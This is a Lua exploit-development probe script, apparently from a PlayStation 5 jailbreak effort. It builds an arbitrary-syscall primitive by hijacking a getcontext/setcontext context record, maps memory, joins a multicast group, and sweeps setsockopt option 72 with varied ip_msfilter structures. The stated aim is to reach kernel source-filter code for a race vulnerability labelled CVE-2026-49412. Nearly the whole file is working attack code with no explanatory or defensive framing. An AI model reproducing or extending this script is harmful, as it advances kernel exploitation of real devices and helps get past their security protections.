-- CRASH_CLASS: LOW
-- PROBE 183a: Determine which struct option 72 actually accepts
--
-- 181a: setsockopt(IPPROTO_IP, 72, ip_msfilter_16bytes) = 0
-- 182a: setsockopt(IPPROTO_IP, 72, group_filter_140bytes) = -1
-- 182a: setsockopt(IPPROTO_IP, 72, 4bytes) = -1
--
-- Hypothesis: option 72 on PS5 accepts struct ip_msfilter (compact, 16 bytes base)
-- NOT struct group_filter (140 bytes base). If so, the source filter code
-- in in_mcast.c IS reachable and CVE-2026-49412 race may work.

print("=== 183a: MSFILTER STRUCT SHAPE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sca = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sca)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x20000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Socket + bind + join
local rv = srop(97, uint64(2), uint64(2), uint64(0))
local s = rv and to_num(rv) or -1
print("sock=" .. s)
if s < 0 then print("DEAD") return end

local BIND = 0x1000
for i = 0, 0x1F, 4 do wd(gpu + BIND + i, 0) end
wd(gpu + BIND, 0x00000210)
srop(104, uint64(s), ga(BIND), uint64(16))

local MREQ = 0x2000
wd(gpu + MREQ, 0x010000E0)
wd(gpu + MREQ + 4, 0)
rv = srop(105, uint64(s), uint64(0), uint64(12), ga(MREQ), uint64(8))
print("JOIN=" .. (rv and to_num(rv) or -999))

-- struct ip_msfilter layout:
--   +0x00: struct in_addr imsf_multiaddr (4 bytes)
--   +0x04: struct in_addr imsf_interface (4 bytes)
--   +0x08: uint32_t imsf_fmode
--   +0x0C: uint32_t imsf_numsrc
--   +0x10: struct in_addr imsf_slist[] (4 bytes each)
-- Base size (0 sources): 0x10 = 16 bytes

print("")
print("--- A: ip_msfilter 16B (INCLUDE, 0 src) ---")
local IMF = 0x4000
for i = 0, 0x3F, 4 do wd(gpu + IMF + i, 0) end
wd(gpu + IMF, 0x010000E0)   -- 224.0.0.1
wd(gpu + IMF + 4, 0)        -- INADDR_ANY
wd(gpu + IMF + 8, 1)        -- MCAST_INCLUDE
wd(gpu + IMF + 12, 0)       -- 0 sources
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(0x10))
local a0 = rv and to_num(rv) or -999
print("opt72(ip_msfilter,0src)=" .. a0)

-- Test B: with 1 source
print("")
print("--- B: ip_msfilter 20B (INCLUDE, 1 src) ---")
wd(gpu + IMF + 12, 1)           -- 1 source
wd(gpu + IMF + 16, 0x0100007F)  -- 127.0.0.1
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(0x14))
local b1 = rv and to_num(rv) or -999
print("opt72(ip_msfilter,1src)=" .. b1)

-- Test C: with 4 sources
print("")
print("--- C: ip_msfilter 32B (INCLUDE, 4 src) ---")
wd(gpu + IMF + 12, 4)
for i = 0, 3 do
    wd(gpu + IMF + 16 + i*4, 0x0100007F + i*0x01000000)
end
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(0x20))
local c4 = rv and to_num(rv) or -999
print("opt72(ip_msfilter,4src)=" .. c4)

-- Test D: with 64 sources (large copyin window)
print("")
print("--- D: ip_msfilter 272B (INCLUDE, 64 src) ---")
wd(gpu + IMF + 12, 64)
for i = 0, 63 do
    wd(gpu + IMF + 16 + i*4, 0x0100007F + i*0x01000000)
end
-- size = 0x10 + 64*4 = 0x110 = 272
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(0x110))
local d64 = rv and to_num(rv) or -999
print("opt72(ip_msfilter,64src)=" .. d64)

-- Test E: with 256 sources (even larger)
print("")
print("--- E: ip_msfilter 1040B (INCLUDE, 256 src) ---")
wd(gpu + IMF + 12, 256)
for i = 0, 255 do
    wd(gpu + IMF + 16 + i*4, 0x01000001 + i)
end
-- size = 0x10 + 256*4 = 0x410
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(0x410))
local e256 = rv and to_num(rv) or -999
print("opt72(ip_msfilter,256src)=" .. e256)

-- Test F: getsockopt to read back
print("")
print("--- F: GETSOCKOPT opt72 ---")
local GR = 0x8000
for i = 0, 0x1F, 4 do wd(gpu + GR + i, 0) end
wd(gpu + GR, 0x010000E0)   -- 224.0.0.1
wd(gpu + GR + 4, 0)        -- INADDR_ANY
local OLEN = 0x9000
wd(gpu + OLEN, 0x200)
rv = srop(118, uint64(s), uint64(0), uint64(72), ga(GR), ga(OLEN))
local fg = rv and to_num(rv) or -999
print("getsockopt(72)=" .. fg)
if fg == 0 then
    local olen = rd(gpu + OLEN)
    local fmode = rd(gpu + GR + 8)
    local numsrc = rd(gpu + GR + 12)
    print("  optlen=" .. olen .. " fmode=" .. fmode .. " numsrc=" .. numsrc)
end

-- Test G: EXCLUDE mode
print("")
print("--- G: EXCLUDE MODE ---")
wd(gpu + IMF + 8, 2)   -- MCAST_EXCLUDE
wd(gpu + IMF + 12, 0)  -- 0 sources
rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(0x10))
print("opt72(EXCLUDE,0src)=" .. (rv and to_num(rv) or -999))

-- Test H: also test option 73 with ip_msfilter struct
print("")
print("--- H: OPT 73 ip_msfilter ---")
wd(gpu + IMF + 8, 1)   -- MCAST_INCLUDE
wd(gpu + IMF + 12, 0)  -- 0 sources
rv = srop(105, uint64(s), uint64(0), uint64(73), ga(IMF), uint64(0x10))
print("opt73(ip_msfilter,0src)=" .. (rv and to_num(rv) or -999))

-- Test I: opt 74 with same ip_msfilter (the "real" IP_MSFILTER)
print("")
print("--- I: OPT 74 ip_msfilter ---")
rv = srop(105, uint64(s), uint64(0), uint64(74), ga(IMF), uint64(0x10))
print("opt74(ip_msfilter,0src)=" .. (rv and to_num(rv) or -999))

-- Test J: size sensitivity for opt 72
print("")
print("--- J: SIZE SWEEP opt72 ---")
wd(gpu + IMF + 8, 1)
wd(gpu + IMF + 12, 0)
for _, sz in ipairs({4, 8, 12, 16, 20, 24, 0x10, 0x14, 0x20, 0x40, 0x80, 0x8C}) do
    rv = srop(105, uint64(s), uint64(0), uint64(72), ga(IMF), uint64(sz))
    local r = rv and to_num(rv) or -999
    if r == 0 then
        print("  size " .. sz .. " = 0 !!!")
    end
end

-- Test K: sweep opts 65-68 with ip_msfilter struct
print("")
print("--- K: OPTS 65-68 ip_msfilter ---")
for opt = 65, 68 do
    rv = srop(105, uint64(s), uint64(0), uint64(opt), ga(IMF), uint64(0x10))
    print("opt" .. opt .. "(ip_msfilter)=" .. (rv and to_num(rv) or -999))
end

srop(6, uint64(s))
print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
